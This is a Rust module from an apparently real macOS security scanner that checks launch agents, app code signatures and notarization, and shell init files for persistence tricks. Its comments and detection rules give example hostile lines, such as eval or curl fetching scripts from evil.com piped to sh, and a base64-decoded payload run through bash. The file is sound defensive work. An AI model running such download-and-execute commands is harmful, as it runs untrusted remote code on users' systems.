// security.rs — Security scanning module for Negative _.
//
// This module scans for potential security issues on macOS:
//   - Launch Agents/Daemons: plist files that auto-run programs at login/boot
//   - App Trust: whether installed apps are properly code-signed and notarized
//   - Shell Init Files: suspicious lines in ~/.zshrc, ~/.bashrc, etc.
//
// IMPORTANT (TCC): For paths that may be TCC-protected, we use subprocesses
// (`test`, `cat`, `codesign`, etc.) instead of in-process filesystem calls.
// This avoids blocking modal permission dialogs in the app UI thread.

use serde::{Deserialize, Serialize};

// We use the home_dir helper from our commands module.
use crate::commands;

// ---------------------------------------------------------------------------
// Data structures
// ---------------------------------------------------------------------------
/// Severity levels for security findings, from most to least critical.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum Severity {
    /// Known malware or clear malicious intent
    Malicious,
    /// Adware, PUPs (potentially unwanted programs), or known-bad patterns
    LikelyUnwanted,
    /// Not definitively bad, but unusual and worth investigating
    Suspicious,
    /// Noteworthy but not harmful (e.g. "this app is not notarized")
    Informational,
}

/// A single security finding — one thing we noticed that the user should know about.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SecurityFinding {
    /// Unique identifier for this finding (e.g. "la-unsigned-001")
    pub id: String,
    /// Category: "launch_agent", "login_item", "app_trust", "shell_init"
    pub category: String,
    /// How severe this finding is
    pub severity: Severity,
    /// Short one-line summary (shown as a heading in the UI)
    pub title: String,
    /// Detailed explanation of what was found and why it matters
    pub description: String,
    /// The file path involved in this finding
    pub path: String,
    /// Evidence lines — specific details supporting the finding
    /// (e.g. "Unsigned binary", "Points to missing target /tmp/evil")
    pub evidence: Vec<String>,
    /// Suggested action the user should take
    pub suggested_action: String,
}

/// Information about a Launch Agent or Launch Daemon.
///
/// macOS uses plist files in specific directories to auto-launch programs:
///   ~/Library/LaunchAgents  — per-user agents (run at login)
///   /Library/LaunchAgents   — system-wide agents (run at login)
///   /Library/LaunchDaemons  — system-wide daemons (run at boot, as root)
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct LaunchItem {
    /// Path to the .plist file
    pub path: String,
    /// The "Label" key from the plist (unique identifier for the agent/daemon)
    pub label: String,
    /// The executable target (from Program or ProgramArguments[0])
    pub program: String,
    /// Whether the target executable actually exists on disk
    pub program_exists: bool,
    /// Whether the agent/daemon is currently loaded (enabled)
    pub is_enabled: bool,
    /// Whether the target executable is code-signed
    pub is_signed: bool,
    /// Who signed the target (e.g. "Apple Inc.", "Developer ID: ...")
    pub signer: String,
    /// Location category: "user_agents", "system_agents", "system_daemons"
    pub location: String,
    /// Security findings associated with this launch item
    pub findings: Vec<SecurityFinding>,
}

/// Information about an app's code-signing and trust status.
///
/// macOS uses code signing and notarization to verify that apps haven't been
/// tampered with and come from known developers.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct AppTrustInfo {
    /// Path to the .app bundle
    pub path: String,
    /// Display name of the app
    pub name: String,
    /// Whether the app is code-signed at all
    pub is_signed: bool,
    /// Whether the signature is valid (hasn't been tampered with)
    pub signature_valid: bool,
    /// Who signed it (developer name / team ID)
    pub signer: String,
    /// Whether the app has been notarized by Apple
    pub is_notarized: bool,
    /// Whether the quarantine flag is set (downloaded from internet)
    pub has_quarantine: bool,
    /// CFBundleIdentifier from the app's Info.plist
    pub bundle_id: String,
    /// Security findings for this app
    pub findings: Vec<SecurityFinding>,
}

/// A suspicious line found in a shell initialization file.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct ShellInitFinding {
    /// Which shell init file (e.g. "/Users/you/.zshrc")
    pub file_path: String,
    /// Line number where the suspicious content was found (1-based)
    pub line_number: u32,
    /// The actual content of the suspicious line
    pub line_content: String,
    /// The security finding describing what's suspicious about it
    pub finding: SecurityFinding,
}

/// Complete result of a full security scan.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SecurityScanResult {
    /// All launch agents/daemons found and analyzed
    pub launch_items: Vec<LaunchItem>,
    /// App trust analysis results
    pub app_trust: Vec<AppTrustInfo>,
    /// Suspicious lines found in shell init files
    pub shell_findings: Vec<ShellInitFinding>,
    /// High-level summary counts
    pub summary: SecuritySummary,
}

/// Summary counts for a security scan — gives the UI quick numbers to display.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SecuritySummary {
    pub total_findings: u32,
    pub malicious: u32,
    pub likely_unwanted: u32,
    pub suspicious: u32,
    pub informational: u32,
}

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

/// Generate a unique finding ID from a category prefix and a counter.
fn make_finding_id(prefix: &str, counter: &mut u32) -> String {
    *counter += 1;
    format!("{}-{:03}", prefix, counter)
}

/// Run a subprocess and return its stdout as a trimmed String.
/// Returns an empty string if the command fails.
fn run_cmd(program: &str, args: &[&str]) -> String {
    crate::commands::run_cmd(program, args)
}

/// Run a subprocess and return whether it exited successfully.
/// This is useful for commands like `test -e` or `codesign -v`.
fn run_cmd_ok(program: &str, args: &[&str]) -> bool {
    crate::commands::run_cmd_ok(program, args)
}

/// Extract a value from a plist file using PlistBuddy.
///
/// PlistBuddy is a macOS tool that reads/writes plist files. We use it
/// because plists can be in binary or XML format, and PlistBuddy handles both.
fn plist_read(plist_path: &str, key: &str) -> String {
    let cmd = format!("Print {}", key);
    run_cmd("/usr/libexec/PlistBuddy", &["-c", &cmd, plist_path])
}

/// Check if a path looks suspicious (commonly used by malware or unwanted software).
fn is_suspicious_path(path: &str) -> bool {
    let suspicious_locations = ["/tmp/", "/var/tmp/", "/private/tmp/", "/users/shared/"];
    let lower = path.to_lowercase();
    // Also flag paths in ~/Downloads — executables shouldn't run from there.
    suspicious_locations.iter().any(|loc| lower.contains(loc)) || lower.contains("/downloads/")
}

/// Compute a SecuritySummary from a flat list of findings.
fn compute_summary(findings: &[&SecurityFinding]) -> SecuritySummary {
    let mut summary = SecuritySummary {
        total_findings: findings.len() as u32,
        malicious: 0,
        likely_unwanted: 0,
        suspicious: 0,
        informational: 0,
    };

    for f in findings {
        match f.severity {
            Severity::Malicious => summary.malicious += 1,
            Severity::LikelyUnwanted => summary.likely_unwanted += 1,
            Severity::Suspicious => summary.suspicious += 1,
            Severity::Informational => summary.informational += 1,
        }
    }

    summary
}

// ---------------------------------------------------------------------------
// Implementation: Launch Items scan
// ---------------------------------------------------------------------------

/// Scan Launch Agents and Daemons for potential security issues.
///
/// This checks three directories:
///   ~/Library/LaunchAgents  — user-level agents (most likely attack surface)
///   /Library/LaunchAgents   — system-wide agents (require admin to install)
///   /Library/LaunchDaemons  — system-wide daemons (require admin, run as root)
///
/// For each plist file found, we:
///   1. Extract the Label and Program/ProgramArguments using PlistBuddy
///   2. Check if the target program exists on disk
///   3. Check if the target is code-signed
///   4. Flag anything suspicious (unsigned, missing target, suspicious path)
pub fn scan_launch_items() -> Vec<LaunchItem> {
    let home = commands::home_dir().unwrap_or_default();
    let mut items: Vec<LaunchItem> = Vec::new();
    let mut finding_counter: u32 = 0;

    let dirs: Vec<(String, &str)> = vec![
        (format!("{}/Library/LaunchAgents", home), "user_agents"),
        ("/Library/LaunchAgents".to_string(), "system_agents"),
        ("/Library/LaunchDaemons".to_string(), "system_daemons"),
    ];

    for (dir, location) in &dirs {
        // Check if the directory exists via subprocess (safe from TCC).
        if !run_cmd_ok("test", &["-d", dir]) {
            continue;
        }

        // List plist files in the directory using `ls`.
        let listing = run_cmd("ls", &[dir]);
        if listing.is_empty() {
            continue;
        }

        for filename in listing.lines() {
            if !filename.ends_with(".plist") {
                continue;
            }

            let plist_path = format!("{}/{}", dir, filename);
            items.push(analyze_launch_item(&plist_path, location, &mut finding_counter));
        }
    }

    items
}

/// Analyze a single launch item plist and return a populated LaunchItem.
///
/// Extracts the Label and Program from the plist, checks if the target exists,
/// verifies code signing, and flags anything suspicious.
fn analyze_launch_item(
    plist_path: &str,
    location: &str,
    finding_counter: &mut u32,
) -> LaunchItem {
    let mut findings: Vec<SecurityFinding> = Vec::new();

    // The "Label" key is the unique identifier for the agent/daemon.
    let label = plist_read(plist_path, "Label");

    // The target program can be specified two ways in a plist:
    //   - "Program": a single string path
    //   - "ProgramArguments": an array where [0] is the executable
    let program = {
        let prog = plist_read(plist_path, "Program");
        if prog.is_empty() {
            plist_read(plist_path, "ProgramArguments:0")
        } else {
            prog
        }
    };

    // --- Check if the target program exists ---
    let program_exists = if program.is_empty() {
        false
    } else {
        run_cmd_ok("test", &["-e", &program])
    };

    // If the plist points to a program that doesn't exist, that's
    // suspicious — it could be leftover malware or a broken agent.
    if !program.is_empty() && !program_exists {
        findings.push(SecurityFinding {
            id: make_finding_id("la", finding_counter),
            category: "launch_agent".to_string(),
            severity: Severity::Suspicious,
            title: "Launch item points to missing program".to_string(),
            description: format!(
                "The launch item '{}' references '{}' which does not exist on disk. \
                 This could be a leftover from uninstalled software or a failed \
                 malware installation.",
                label, program
            ),
            path: plist_path.to_string(),
            evidence: vec![
                format!("Target: {}", program),
                "Target does not exist on disk".to_string(),
            ],
            suggested_action: "Review and consider removing this launch item.".to_string(),
        });
    }

    // --- Check code signing ---
    let is_signed = if program_exists {
        run_cmd_ok("codesign", &["-v", &program])
    } else {
        false
    };

    let signer = if program_exists && is_signed {
        let signer_output = match std::process::Command::new("codesign")
            .args(["-d", "--verbose=2", &program])
            .output()
        {
            Ok(o) => String::from_utf8_lossy(&o.stderr).to_string(),
            Err(_) => String::new(),
        };
        signer_output
            .lines()
            .find(|line| line.starts_with("Authority="))
            .map(|line| line.trim_start_matches("Authority=").to_string())
            .unwrap_or_else(|| "Unknown signer".to_string())
    } else {
        String::new()
    };

    // Flag unsigned programs — legitimate software is almost always signed.
    if program_exists && !is_signed {
        findings.push(SecurityFinding {
            id: make_finding_id("la", finding_counter),
            category: "launch_agent".to_string(),
            severity: Severity::Suspicious,
            title: "Launch item target is unsigned".to_string(),
            description: format!(
                "The program '{}' launched by '{}' is not code-signed. \
                 Legitimate macOS software is typically signed by its developer. \
                 Unsigned launch items are a common indicator of adware or malware.",
                program, label
            ),
            path: plist_path.to_string(),
            evidence: vec![
                format!("Target: {}", program),
                "Binary is not code-signed".to_string(),
            ],
            suggested_action:
                "Investigate this program. If you don't recognize it, consider removing it."
                    .to_string(),
        });
    }

    // Flag programs in suspicious locations.
    if !program.is_empty() && is_suspicious_path(&program) {
        findings.push(SecurityFinding {
            id: make_finding_id("la", finding_counter),
            category: "launch_agent".to_string(),
            severity: Severity::LikelyUnwanted,
            title: "Launch item target in suspicious location".to_string(),
            description: format!(
                "The program '{}' is in a temporary or unusual directory. \
                 Legitimate software rarely runs from /tmp, /var/tmp, or Downloads. \
                 This is a common pattern for adware and malware persistence.",
                program
            ),
            path: plist_path.to_string(),
            evidence: vec![
                format!("Target: {}", program),
                "Located in suspicious directory".to_string(),
            ],
            suggested_action:
                "This is likely unwanted software. Consider removing this launch item and its target."
                    .to_string(),
        });
    }

    // --- Check if the agent is enabled (loaded) ---
    let is_enabled = if !label.is_empty() {
        run_cmd_ok("launchctl", &["list", &label])
    } else {
        false
    };

    LaunchItem {
        path: plist_path.to_string(),
        label,
        program,
        program_exists,
        is_enabled,
        is_signed,
        signer,
        location: location.to_string(),
        findings,
    }
}

// ---------------------------------------------------------------------------
// Implementation: App Trust scan
// ---------------------------------------------------------------------------

/// Check code-signing, notarization, and quarantine status for a list of apps.
///
/// This helps users identify apps that may have been tampered with, aren't
/// from identified developers, or were downloaded from the internet without
/// Apple's notarization check.
///
pub fn scan_app_trust(apps: &[String]) -> Vec<AppTrustInfo> {
    let mut results: Vec<AppTrustInfo> = Vec::new();
    let mut finding_counter: u32 = 0;

    for app_path in apps {
        let mut findings: Vec<SecurityFinding> = Vec::new();

        // Get the app name from the path (e.g. "Safari" from "/Applications/Safari.app").
        let name = std::path::Path::new(app_path)
            .file_stem()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string();

        // Read the bundle ID from Info.plist.
        let plist_path = format!("{}/Contents/Info.plist", app_path);
        let bundle_id = plist_read(&plist_path, "CFBundleIdentifier");

        // --- Check signature validity ---
        // `codesign -v --deep` does a deep verification of the entire app bundle.
        // Exit code 0 means the signature is valid.
        let signature_valid = run_cmd_ok("codesign", &["-v", "--deep", app_path]);

        // Check if the app is signed at all (a different check from validity).
        // An app can be unsigned (codesign -d fails) or signed-but-invalid.
        let codesign_detail = match std::process::Command::new("codesign")
            .args(["-d", "--verbose=2", app_path])
            .output()
        {
            Ok(o) => String::from_utf8_lossy(&o.stderr).to_string(),
            Err(_) => String::new(),
        };
        // If codesign -d produces any "Authority=" line, the app is signed.
        let is_signed = codesign_detail.contains("Authority=");

        // Extract the signer name from the first "Authority=" line.
        let signer = codesign_detail
            .lines()
            .find(|line| line.starts_with("Authority="))
            .map(|line| line.trim_start_matches("Authority=").to_string())
            .unwrap_or_default();

        // Flag unsigned apps.
        if !is_signed {
            findings.push(SecurityFinding {
                id: make_finding_id("at", &mut finding_counter),
                category: "app_trust".to_string(),
                severity: Severity::Suspicious,
                title: format!("'{}' is not code-signed", name),
                description: format!(
                    "The app '{}' has no code signature. This means macOS cannot \
                     verify who created it or whether it has been tampered with. \
                     Most legitimate apps are signed by their developers.",
                    name
                ),
                path: app_path.clone(),
                evidence: vec!["No code signature found".to_string()],
                suggested_action:
                    "Verify you downloaded this app from a trusted source. Consider replacing it with a signed version."
                        .to_string(),
            });
        }

        // Flag signed but invalid signature (tampered app).
        if is_signed && !signature_valid {
            findings.push(SecurityFinding {
                id: make_finding_id("at", &mut finding_counter),
                category: "app_trust".to_string(),
                severity: Severity::Malicious,
                title: format!("'{}' has an INVALID code signature", name),
                description: format!(
                    "The app '{}' is code-signed but the signature is INVALID. \
                     This means the app has been modified after signing — it may \
                     have been tampered with or infected with malware.",
                    name
                ),
                path: app_path.clone(),
                evidence: vec![
                    "Code signature is invalid".to_string(),
                    "App may have been tampered with".to_string(),
                ],
                suggested_action:
                    "DO NOT RUN THIS APP. Delete it and re-download from the original source."
                        .to_string(),
            });
        }

        // --- Check notarization ---
        // `spctl --assess --type execute` checks if macOS would allow the app to run.
        // This implicitly checks notarization on macOS 10.15+.
        let is_notarized = run_cmd_ok("spctl", &["--assess", "--type", "execute", app_path]);

        // Flag non-notarized apps (informational — many legitimate apps aren't notarized).
        if is_signed && signature_valid && !is_notarized {
            findings.push(SecurityFinding {
                id: make_finding_id("at", &mut finding_counter),
                category: "app_trust".to_string(),
                severity: Severity::Informational,
                title: format!("'{}' is not notarized by Apple", name),
                description: format!(
                    "The app '{}' is properly signed but has not been notarized by Apple. \
                     Notarization is an additional check where Apple scans the app for malware. \
                     Many legitimate developer tools skip notarization.",
                    name
                ),
                path: app_path.clone(),
                evidence: vec!["App is signed but not notarized".to_string()],
                suggested_action:
                    "This is usually fine for developer tools. Verify the source if uncertain."
                        .to_string(),
            });
        }

        // --- Check quarantine flag ---
        // The com.apple.quarantine xattr is set on files downloaded from the internet.
        // `xattr -l` lists all extended attributes.
        let xattr_output = run_cmd("xattr", &["-l", app_path]);
        let has_quarantine = xattr_output.contains("com.apple.quarantine");

        results.push(AppTrustInfo {
            path: app_path.clone(),
            name,
            is_signed,
            signature_valid,
            signer,
            is_notarized,
            has_quarantine,
            bundle_id,
            findings,
        });
    }

    results
}

// ---------------------------------------------------------------------------
// Implementation: Shell Init Files scan
// ---------------------------------------------------------------------------

/// Scan shell initialization files for suspicious patterns.
///
/// Shell init files (~/.zshrc, ~/.bashrc, etc.) run every time you open a
/// terminal. Malware sometimes adds lines to these files to maintain persistence
/// or to hijack your PATH.
///
/// We look for patterns like:
///   - Remote code execution: `eval "$(curl ...)"`
///   - Download-and-execute: `curl ... | sh`
///   - Suspicious PATH modifications pointing to /tmp or hidden directories
///   - Base64-encoded payloads being decoded and executed
pub fn scan_shell_inits() -> Vec<ShellInitFinding> {
    let home = commands::home_dir().unwrap_or_default();
    let mut results: Vec<ShellInitFinding> = Vec::new();
    let mut finding_counter: u32 = 0;

    let init_files = vec![
        ".zshrc",
        ".bashrc",
        ".bash_profile",
        ".zprofile",
        ".profile",
    ];

    for filename in &init_files {
        let file_path = format!("{}/{}", home, filename);

        // Check if the file is readable via subprocess (safe from TCC).
        if !run_cmd_ok("test", &["-r", &file_path]) {
            continue;
        }

        // Read the file content via `cat` subprocess.
        // IMPORTANT: We use a subprocess instead of std::fs::read_to_string()
        // because shell init files may be in TCC-protected locations, and
        // in-process reads can trigger permission dialogs.
        let content = run_cmd("cat", &[&file_path]);
        if content.is_empty() {
            continue;
        }

        // Check each line for suspicious patterns.
        for (line_idx, line) in content.lines().enumerate() {
            let line_number = (line_idx + 1) as u32; // 1-based line numbers
            let trimmed = line.trim();

            // Skip empty lines and comments.
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }

            // --- Pattern 1: Remote code execution via eval + curl/wget ---
            // e.g. `eval "$(curl -s https://evil.com/payload.sh)"`
            if trimmed.contains("eval") && (trimmed.contains("curl") || trimmed.contains("wget")) {
                results.push(ShellInitFinding {
                    file_path: file_path.clone(),
                    line_number,
                    line_content: trimmed.to_string(),
                    finding: SecurityFinding {
                        id: make_finding_id("sh", &mut finding_counter),
                        category: "shell_init".to_string(),
                        severity: Severity::Malicious,
                        title: "Remote code execution in shell init".to_string(),
                        description: format!(
                            "Line {} of {} uses eval with curl/wget to download and \
                             execute remote code. This is a common malware persistence \
                             technique — code is fetched from a remote server every time \
                             you open a terminal.",
                            line_number, filename
                        ),
                        path: file_path.clone(),
                        evidence: vec![
                            format!("Line {}: {}", line_number, trimmed),
                            "eval + curl/wget = remote code execution".to_string(),
                        ],
                        suggested_action:
                            "Remove this line immediately unless you added it yourself and trust the source."
                                .to_string(),
                    },
                });
                continue;
            }

            // --- Pattern 2: Download-and-execute pipes ---
            // e.g. `curl https://evil.com/script.sh | sh`
            //       `wget -O - https://evil.com/script.sh | bash`
            let has_download = trimmed.contains("curl") || trimmed.contains("wget");
            let has_pipe_exec = trimmed.contains("| sh")
                || trimmed.contains("| bash")
                || trimmed.contains("| zsh")
                || trimmed.contains("|sh")
                || trimmed.contains("|bash");
            if has_download && has_pipe_exec {
                results.push(ShellInitFinding {
                    file_path: file_path.clone(),
                    line_number,
                    line_content: trimmed.to_string(),
                    finding: SecurityFinding {
                        id: make_finding_id("sh", &mut finding_counter),
                        category: "shell_init".to_string(),
                        severity: Severity::Malicious,
                        title: "Download-and-execute pipe in shell init".to_string(),
                        description: format!(
                            "Line {} of {} downloads content from the internet and pipes it \
                             directly to a shell for execution. This runs every time you \
                             open a terminal.",
                            line_number, filename
                        ),
                        path: file_path.clone(),
                        evidence: vec![
                            format!("Line {}: {}", line_number, trimmed),
                            "curl/wget piped to sh/bash = download-and-execute".to_string(),
                        ],
                        suggested_action:
                            "Remove this line unless you added it yourself and trust the URL."
                                .to_string(),
                    },
                });
                continue;
            }

            // --- Pattern 3: Base64-encoded payloads ---
            // e.g. `echo "SGVsbG8=" | base64 --decode | bash`
            if trimmed.contains("base64")
                && (trimmed.contains("decode") || trimmed.contains("-d"))
                && (trimmed.contains("bash") || trimmed.contains("sh") || trimmed.contains("eval"))
            {
                results.push(ShellInitFinding {
                    file_path: file_path.clone(),
                    line_number,
                    line_content: trimmed.to_string(),
                    finding: SecurityFinding {
                        id: make_finding_id("sh", &mut finding_counter),
                        category: "shell_init".to_string(),
                        severity: Severity::Malicious,
                        title: "Base64-encoded payload execution".to_string(),
                        description: format!(
                            "Line {} of {} decodes base64 content and executes it. \
                             This is a common obfuscation technique used by malware \
                             to hide malicious commands.",
                            line_number, filename
                        ),
                        path: file_path.clone(),
                        evidence: vec![
                            format!("Line {}: {}", line_number, trimmed),
                            "Base64 decode piped to shell execution".to_string(),
                        ],
                        suggested_action:
                            "Decode and inspect the base64 content. Remove the line if you don't recognize it."
                                .to_string(),
                    },
                });
                continue;
            }

            // --- Pattern 4: PATH modifications pointing to suspicious locations ---
            // e.g. `export PATH="/tmp/evil:$PATH"`
            if trimmed.contains("export PATH=") || trimmed.contains("PATH=") {
                let has_suspicious_dir = trimmed.contains("/tmp/")
                    || trimmed.contains("/var/tmp/")
                    || trimmed.contains("/private/tmp/");
                let has_hidden_dir = trimmed.contains("/.");

                if has_suspicious_dir {
                    results.push(ShellInitFinding {
                        file_path: file_path.clone(),
                        line_number,
                        line_content: trimmed.to_string(),
                        finding: SecurityFinding {
                            id: make_finding_id("sh", &mut finding_counter),
                            category: "shell_init".to_string(),
                            severity: Severity::LikelyUnwanted,
                            title: "PATH includes temporary directory".to_string(),
                            description: format!(
                                "Line {} of {} adds a temporary directory (/tmp or /var/tmp) \
                                 to your PATH. Programs in temporary directories are ephemeral \
                                 and could be replaced by any process on the system.",
                                line_number, filename
                            ),
                            path: file_path.clone(),
                            evidence: vec![
                                format!("Line {}: {}", line_number, trimmed),
                                "PATH includes /tmp or /var/tmp".to_string(),
                            ],
                            suggested_action:
                                "Remove the temporary directory from your PATH modification."
                                    .to_string(),
                        },
                    });
                }

                if has_hidden_dir {
                    results.push(ShellInitFinding {
                        file_path: file_path.clone(),
                        line_number,
                        line_content: trimmed.to_string(),
                        finding: SecurityFinding {
                            id: make_finding_id("sh", &mut finding_counter),
                            category: "shell_init".to_string(),
                            severity: Severity::Suspicious,
                            title: "PATH includes hidden directory".to_string(),
                            description: format!(
                                "Line {} of {} adds a hidden directory (name starts with '.') \
                                 to your PATH. While some tools use hidden directories (like \
                                 ~/.local/bin), unexpected hidden directories in PATH can be \
                                 used to shadow legitimate commands.",
                                line_number, filename
                            ),
                            path: file_path.clone(),
                            evidence: vec![
                                format!("Line {}: {}", line_number, trimmed),
                                "PATH includes a hidden directory".to_string(),
                            ],
                            suggested_action:
                                "Verify the hidden directory is from a tool you installed."
                                    .to_string(),
                        },
                    });
                }

                continue;
            }

            // --- Pattern 5: References to /tmp or /var/tmp in non-PATH lines ---
            // (e.g. sourcing scripts from temp dirs)
            if (trimmed.contains("/tmp/") || trimmed.contains("/var/tmp/"))
                && (trimmed.starts_with("source ")
                    || trimmed.starts_with(". ")
                    || trimmed.starts_with("eval "))
            {
                results.push(ShellInitFinding {
                    file_path: file_path.clone(),
                    line_number,
                    line_content: trimmed.to_string(),
                    finding: SecurityFinding {
                        id: make_finding_id("sh", &mut finding_counter),
                        category: "shell_init".to_string(),
                        severity: Severity::Suspicious,
                        title: "Shell init sources file from temporary directory".to_string(),
                        description: format!(
                            "Line {} of {} sources or evaluates a file from a temporary \
                             directory. Temp directories are writable by all users, so \
                             any process could replace that file with malicious code.",
                            line_number, filename
                        ),
                        path: file_path.clone(),
                        evidence: vec![
                            format!("Line {}: {}", line_number, trimmed),
                            "Sources/evals file from /tmp or /var/tmp".to_string(),
                        ],
                        suggested_action:
                            "Move the sourced file to a permanent, user-owned directory."
                                .to_string(),
                    },
                });
            }
        }
    }

    results
}

// ---------------------------------------------------------------------------
// Public: Full security scan (combines all sub-scans)
// ---------------------------------------------------------------------------

/// Run a complete security scan combining launch items, app trust, and shell init checks.
///
/// The `app_paths` parameter specifies which apps to check for trust. If empty,
/// we'll scan all apps in /Applications.
pub fn run_full_scan() -> SecurityScanResult {
    // 1. Scan launch items.
    let launch_items = scan_launch_items();

    // 2. Scan app trust for all apps in /Applications.
    // List .app bundles in /Applications via subprocess.
    let app_listing = run_cmd("ls", &["/Applications"]);
    let app_paths: Vec<String> = app_listing
        .lines()
        .filter(|name| name.ends_with(".app"))
        .map(|name| format!("/Applications/{}", name))
        .collect();
    let app_trust = scan_app_trust(&app_paths);

    // 3. Scan shell init files.
    let shell_findings = scan_shell_inits();

    // 4. Compute summary from all findings.
    let all_findings: Vec<&SecurityFinding> = launch_items
        .iter()
        .flat_map(|item| item.findings.iter())
        .chain(app_trust.iter().flat_map(|app| app.findings.iter()))
        .chain(shell_findings.iter().map(|sf| &sf.finding))
        .collect();

    let summary = compute_summary(&all_findings);

    SecurityScanResult {
        launch_items,
        app_trust,
        shell_findings,
        summary,
    }
}

// ---------------------------------------------------------------------------
// Public: Disable / Remove launch items
// ---------------------------------------------------------------------------

/// Disable a launch agent/daemon by unloading it via `launchctl`.
///
/// This does NOT delete the plist file — it just prevents the agent from
/// running until the next reboot (or until it's manually re-loaded).
pub fn disable_launch_item(plist_path: &str) -> Result<(), String> {
    // Verify the plist file exists.
    if !run_cmd_ok("test", &["-f", plist_path]) {
        return Err(format!("Plist file not found: {}", plist_path));
    }

    // `launchctl unload` stops the agent and prevents it from auto-starting.
    // The `-w` flag writes the disabled state persistently.
    let output = std::process::Command::new("launchctl")
        .args(["unload", "-w", plist_path])
        .output()
        .map_err(|e| format!("Failed to run launchctl: {}", e))?;

    if output.status.success() {
        Ok(())
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        Err(format!("launchctl unload failed: {}", stderr))
    }
}

/// Remove a launch agent/daemon by unloading it and deleting the plist file.
///
/// WARNING: This permanently removes the launch item. The user should be
/// confident they want to do this before calling.
pub fn remove_launch_item(plist_path: &str) -> Result<(), String> {
    // First, try to unload it (ignore errors — it might already be unloaded).
    let _ = std::process::Command::new("launchctl")
        .args(["unload", "-w", plist_path])
        .output();

    // Check if the file exists before trying to delete.
    if !run_cmd_ok("test", &["-f", plist_path]) {
        return Err(format!("Plist file not found: {}", plist_path));
    }

    // Delete the plist file (LaunchAgent plists are user-owned, not TCC-protected).
    std::fs::remove_file(plist_path)
        .map_err(|e| format!("Failed to delete {}: {}", plist_path, e))?;

    Ok(())
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -- Suspicious path detection --
    // Motivation: is_suspicious_path gates whether a launch agent gets flagged.
    // A false negative means malware running from /tmp gets a clean report.
    // A false positive means legitimate software gets flagged, eroding user trust.

    #[test]
    fn flags_tmp_paths() {
        assert!(is_suspicious_path("/tmp/evil_binary"));
        assert!(is_suspicious_path("/private/tmp/payload"));
        assert!(is_suspicious_path("/var/tmp/miner"));
    }

    #[test]
    fn flags_downloads_paths() {
        assert!(is_suspicious_path("/Users/alice/Downloads/installer.sh"));
    }

    #[test]
    fn flags_users_shared() {
        assert!(is_suspicious_path("/Users/Shared/backdoor"));
    }

    #[test]
    fn case_insensitive() {
        assert!(is_suspicious_path("/TMP/EVIL"));
        assert!(is_suspicious_path("/Users/alice/DOWNLOADS/script.sh"));
    }

    #[test]
    fn does_not_flag_normal_paths() {
        assert!(!is_suspicious_path("/usr/local/bin/node"));
        assert!(!is_suspicious_path("/Applications/Safari.app/Contents/MacOS/Safari"));
        assert!(!is_suspicious_path("/Library/LaunchDaemons/com.apple.syslog.plist"));
    }

    // -- Summary counting --
    // Motivation: compute_summary feeds the dashboard severity cards. If counts
    // are wrong, users may ignore a scan that found malware (showing 0 malicious)
    // or panic over a clean system (inflated counts).

    #[test]
    fn counts_severity_levels_correctly() {
        let findings = vec![
            SecurityFinding {
                id: "1".into(), category: "test".into(), severity: Severity::Malicious,
                title: "".into(), description: "".into(), path: "".into(),
                evidence: vec![], suggested_action: "".into(),
            },
            SecurityFinding {
                id: "2".into(), category: "test".into(), severity: Severity::Malicious,
                title: "".into(), description: "".into(), path: "".into(),
                evidence: vec![], suggested_action: "".into(),
            },
            SecurityFinding {
                id: "3".into(), category: "test".into(), severity: Severity::Suspicious,
                title: "".into(), description: "".into(), path: "".into(),
                evidence: vec![], suggested_action: "".into(),
            },
            SecurityFinding {
                id: "4".into(), category: "test".into(), severity: Severity::Informational,
                title: "".into(), description: "".into(), path: "".into(),
                evidence: vec![], suggested_action: "".into(),
            },
        ];

        let refs: Vec<&SecurityFinding> = findings.iter().collect();
        let summary = compute_summary(&refs);

        assert_eq!(summary.total_findings, 4);
        assert_eq!(summary.malicious, 2);
        assert_eq!(summary.likely_unwanted, 0);
        assert_eq!(summary.suspicious, 1);
        assert_eq!(summary.informational, 1);
    }

    #[test]
    fn empty_findings_produce_zero_counts() {
        let summary = compute_summary(&[]);
        assert_eq!(summary.total_findings, 0);
        assert_eq!(summary.malicious, 0);
        assert_eq!(summary.likely_unwanted, 0);
        assert_eq!(summary.suspicious, 0);
        assert_eq!(summary.informational, 0);
    }
}
